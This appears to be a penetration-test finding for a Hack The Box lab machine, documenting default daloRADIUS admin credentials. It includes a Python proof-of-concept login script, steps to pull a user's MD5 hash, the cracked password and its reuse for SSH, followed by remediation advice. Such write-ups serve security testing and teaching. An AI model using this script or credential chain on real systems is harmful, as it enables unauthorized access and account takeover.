# Use of Default Credentials in daloRADIUS Admin Portal

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2026-03-06 20:11:30 UTC
**Target:** http://underpass.htb/daloradius/app/operators/login.php
**Endpoint:** /daloradius/app/operators/login.php
**Method:** POST
**CWE:** CWE-798
**CVSS:** 9.8

## Description

The daloRADIUS web management application on `http://underpass.htb/daloradius/` is configured with default administrator credentials (`administrator`:`radius`). An attacker can use these credentials to gain full administrative access to the daloRADIUS portal, view and edit users, system configurations, and billing details. Through this access, the attacker extracted MD5 password hashes of other users, facilitating further attacks.

## Impact

Full administrative access to the daloRADIUS application, allowing an attacker to modify RADIUS configurations, view billing information, create or delete user accounts, and extract password hashes. This ultimately leads to unauthorized system access.

## Technical Analysis

During the initial enumeration, the daloRADIUS 2.2 beta portal was identified at `/daloradius/`. By attempting commonly known default credentials, access was granted using the username `administrator` and the password `radius`. Once authenticated, an attacker can access the Management section (`mng-list-all.php`) to view all registered users and their details.

By navigating to the "Edit User" page for the user `svcMosh`, the attacker can view the `7__MD5-Password` attribute, exposing the user's MD5 password hash `412DD4759978ACFCC81DEAB01B382403`. This hash can easily be cracked to reveal the plaintext password, which in this case was `underwaterfriends`.

Additionally, the same password was reused for SSH access on the system for the user `svcMosh`.

## Proof of Concept

1. Navigate to `http://underpass.htb/daloradius/app/operators/login.php`.
2. Enter the default username `administrator` and password `radius`.
3. Click "Login Please".
4. Navigate to "Management" -> "Users" -> "List Users" (`mng-list-all.php`).
5. Click on the user `svcMosh` to edit.
6. Observe the MD5 password hash in the `7__MD5-Password` attribute field (`412DD4759978ACFCC81DEAB01B382403`).
7. Use a cracking tool or online service to crack the MD5 hash (result: `underwaterfriends`).

```
import requests
from bs4 import BeautifulSoup

url = "http://underpass.htb/daloradius/app/operators/login.php"
login_url = "http://underpass.htb/daloradius/app/operators/dologin.php"

session = requests.Session()

# 1. Fetch CSRF token
r = session.get(url)
soup = BeautifulSoup(r.text, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrf_token'})['value']

# 2. Login with default credentials
data = {
    'operator_user': 'administrator',
    'operator_pass': 'radius',
    'csrf_token': csrf_token,
    'location': 'default'
}

res = session.post(login_url, data=data, allow_redirects=False)
if res.status_code == 302 and "index.php" in res.headers.get('Location', ''):
    print("SUCCESS: Logged in with default credentials (administrator:radius)")
else:
    print("FAILURE: Could not log in")
```

## Remediation

1. Change the default password for the `administrator` account in daloRADIUS immediately.
2. Enforce a strong password policy for all operator accounts.
3. Consider implementing Multi-Factor Authentication (MFA) or restricting access to the management interface to trusted IP addresses only.
